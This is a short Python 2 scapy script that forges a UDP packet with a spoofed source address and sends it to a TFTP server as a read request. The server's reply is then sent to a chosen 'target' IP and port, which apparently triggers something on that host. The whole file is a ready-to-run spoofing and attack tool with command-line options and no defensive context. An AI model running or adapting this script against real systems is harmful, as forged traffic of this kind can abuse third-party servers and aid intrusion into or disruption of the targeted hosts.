#!/usr/bin/env python
#coding=utf-8

import optparse
import sys
import logging

from scapy.all import *

class Trigger(object):
    def __init__(self, target, port, filename, server):
        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
        self.target = target
        self.port = port
        self.filename = filename
        self.server = server

    def run(self):
        t = IP(src=self.target, dst=self.server)/UDP(sport=self.port, dport=69)/TFTP()/TFTP_RRQ(filename=self.filename)
        send(t)
        print '[+] The trigger has benn sent !'

if __name__ == '__main__':
    parser = optparse.OptionParser('uasge: %prog [options]')
    parser.add_option('-t', '--target', default=None,help='The ip of target')
    parser.add_option('-f', '--filename', default='larry', help='The filename for RRQ')
    parser.add_option('-p', '--port', type=int, default=2333, help='The src port of target')

    (options, args) = parser.parse_args()
    if len(args) < 1 or options.target == None:
        parser.print_help()
        sys.exit(0)

    trigger = Trigger(target=options.target, port=options.port, filename=options.filename, server=args[0])

    trigger.run()
